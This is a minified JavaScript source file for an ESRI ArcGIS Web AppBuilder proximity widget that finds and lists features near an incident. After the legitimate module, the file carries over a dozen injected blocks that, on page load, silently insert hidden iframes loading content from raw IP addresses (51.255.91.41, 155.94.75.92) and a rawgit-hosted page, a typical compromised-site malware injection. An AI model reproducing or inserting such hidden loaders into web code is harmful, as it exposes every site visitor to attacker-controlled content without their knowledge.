// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/_base/Color dojo/_base/array dojo/dom-class dojo/dom-construct dojo/dom-style dojo/on esri/geometry/geometryEngine esri/geometry/Polyline esri/geometry/webMercatorUtils esri/graphic esri/layers/FeatureLayer esri/symbols/SimpleMarkerSymbol esri/symbols/SimpleLineSymbol esri/symbols/Font esri/symbols/TextSymbol esri/tasks/query jimu/CSVUtils".split(" "),function(B,n,v,k,g,m,C,q,w,D,x,y,E,z,A,F,G,H,I){return B("ProximityInfo",null,{constructor:function(b,
c,a){this.tab=b;this.container=c;this.parent=a;this.graphicsLayer=this.buffer=this.incident=this.featureLayer=null;this.specialFields={}},updateForIncident:function(b,c,a){if(this.featureLayer)this.processIncident(b,c,a);else if(0<this.tab.tabLayers.length){var d=new E(this.tab.tabLayers[0].url);q(d,"load",n.hitch(this,function(){d.capabilities&&-1<d.capabilities.indexOf("Query")?(this.featureLayer=d,this.processIncident(b,c,a)):this._processError()}));q(this.parent.opLayers,"layerInfosFilterChanged",
n.hitch(this,this._layerFilterChanged))}},_layerFilterChanged:function(b){if(null!==this.featureLayer&&null!==this.incident&&null!==this.buffer&&null!==this.graphicsLayer){var c=this.tab.tabLayers[0].id;k.forEach(b,n.hitch(this,function(a){c===a.id&&this.processIncident(this.incident,this.buffer,this.graphicsLayer)}))}},processIncident:function(b,c,a){this.container.innerHTML="";g.add(this.container,"loading");var d=[];this.incident=b;this.buffer=c;this.graphicsLayer=a;this.graphicsLayer.clear();
var f=this.tab.tabLayers[0].id,e="";this.parent.opLayers.traversal(function(a){if(f===a.id&&a.getFilter())return e=a.getFilter(),!0});a=new H;a.returnGeometry=!0;a.geometry=c.geometry;a.where=e;a.outFields=this._getFields(this.featureLayer);a.outSpatialReference=this.parent.map.spatialReference;this.featureLayer.queryFeatures(a,n.hitch(this,function(a){var c=this._getFields(this.featureLayer);a=a.features;if(0<a.length)for(var h=0;h<a.length;h++){for(var e=a[h],f={DISTANCE:this._getDistance(b.geometry,
e.geometry)},g=0;g<c.length;g++)f[c[g]]=e.attributes[c[g]];e.attributes=f;d.push(e)}this._processResults(d)}),n.hitch(this,this._processError))},_processError:function(){this.container.innerHTML="";g.remove(this.container,"loading");this.container.innerHTML=this.parent.nls.noFeaturesFound},_processResults:function(b){this.container.innerHTML="";g.remove(this.container,"loading");this.graphicsLayer.clear();if(0===b.length)this.container.innerHTML=this.parent.nls.noFeaturesFound;else{b.sort(this._compareDistance);
var c=m.create("div",{id:"tpc",style:"width:"+220*(b.length+1)+"px;"},this.container);g.add(c,"IMT_tabPanelContent");var a=m.create("div",{},c);g.add(a,"IMTcol");a=m.create("div",{innerHTML:this.parent.nls.downloadCSV},a);g.add(a,"btnExport");q(a,"click",n.hitch(this,this._exportToCSV,b));for(var a=this.parent.nls[this.parent.config.distanceUnits],d=0;d<b.length;d++){var f=d+1,e=b[d],h=e.geometry,k=h;"point"!==h.type&&(k=h.getExtent().getCenter());var e=e.attributes,p=a+": "+Math.round(100*e.DISTANCE)/
100,h="",l=0,r;for(r in e)"DISTANCE"!==r&&3>l&&(h+=this._getFieldValue(r,e[r])+"\x3cbr/\x3e",l+=1);l=m.create("div",{id:"Feature_"+f},c);g.add(l,"IMTcolRec");var t=m.create("div",{},l);g.add(t,"IMTcolRecBar");var u=m.create("div",{innerHTML:f},t);g.add(u,"IMTcolRecNum");C.set(u,"backgroundColor",this.parent.config.color);q(u,"click",n.hitch(this,this._zoomToLocation,k));p=m.create("div",{innerHTML:p},t);g.add(p,"IMTcolDistance");this.parent.config.enableRouting&&(p=m.create("div",{},t),g.add(p,"IMTcolDir"),
q(p,"click",n.hitch(this,this._routeToIncident,k)));h=m.create("div",{innerHTML:h},l);g.add(h,"IMTcolInfo");h=new A(A.STYLE_SOLID,new v.fromString(this.parent.config.color),1);h=new z(z.STYLE_CIRCLE,24,h,new v.fromString(this.parent.config.color));l=new F;l.family="Arial";l.size="12px";f=new G(f,l,"#ffffff");f.setOffset(0,-4);this.graphicsLayer.add(new y(k,h,e));this.graphicsLayer.add(new y(k,f,e))}}},_exportToCSV:function(b){if(0===b.length)return!1;var c=this.tab.layers,a=[],d=[];k.forEach(b,function(b){a.push(b.attributes)});
for(var f in a[0])d.push(f);I.exportCSV(c,a,d)},_getFields:function(b){var c=[];if(this.tab.advConfig&&this.tab.advConfig.fields&&0<this.tab.advConfig.fields.length)k.forEach(this.tab.advConfig.fields,function(a){c.push(a.expression)});else{var a;a=b.infoTemplate?b.infoTemplate.info.fieldInfos:b.fields;for(var d=0;d<a.length;d++){var f=a[d];"undefined"!==typeof f.visible?f.visible&&c.push(f.fieldName):c.push(f.name)}}var e={};k.forEach(b.fields,function(a){if("esriFieldTypeDate"===a.type||a.domain)e[a.name]=
a});this.specialFields=e;return c},_getFieldValue:function(b,c){var a=c;this.specialFields[b]&&(b=this.specialFields[b],"esriFieldTypeDate"===b.type?a=(new Date(c)).toLocaleString():k.some(b.domain.codedValues,function(b){if(b.code===c)return a=b.name,!0}));return a},_getDistance:function(b,c){var a=0;4326===b.spatialReference.wkid&&(b=x.geographicToWebMercator(b));a="point"===b.type?b:b.getExtent().getCenter();4326===c.spatialReference.wkid&&(c=x.geographicToWebMercator(c));b="point"===c.type?c:
c.getExtent().getCenter();c=this.parent.config.distanceUnits;var d=new D(a.spatialReference);d.addPath([a,b]);a=a.spatialReference.isWebMercator()?w.geodesicLength(d,9001):w.planarLength(d,9001);switch(c){case "miles":a*=6.21371E-4;break;case "kilometers":a*=.001;break;case "feet":a*=3.28084;break;case "yards":a*=1.09361;break;case "nauticalMiles":a*=5.39957E-4}return a},_compareDistance:function(b,c){return b.attributes.DISTANCE<c.attributes.DISTANCE?-1:b.attributes.DISTANCE>c.attributes.DISTANCE?
1:0},_zoomToLocation:function(b){this.parent.zoomToLocation(b)},_routeToIncident:function(b){this.parent.routeToIncident(b)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});